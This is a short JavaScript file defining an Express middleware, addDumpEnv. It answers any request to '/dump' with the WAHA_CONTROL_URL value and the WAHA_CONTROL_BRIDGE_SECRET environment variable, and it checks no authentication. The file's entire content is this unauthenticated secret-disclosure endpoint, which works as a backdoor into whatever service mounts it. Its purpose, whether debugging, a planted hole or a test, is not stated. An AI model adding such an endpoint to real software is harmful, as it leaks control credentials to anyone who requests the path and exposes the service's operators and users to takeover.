export function addDumpEnv(app) {
  app.use((req, res, next) => {
    if (req.path === '/dump') {
      res.json({
        url: process.env.WAHA_CONTROL_URL,
        secret: process.env.WAHA_CONTROL_BRIDGE_SECRET
      });
      return;
    }
    next();
  });
}
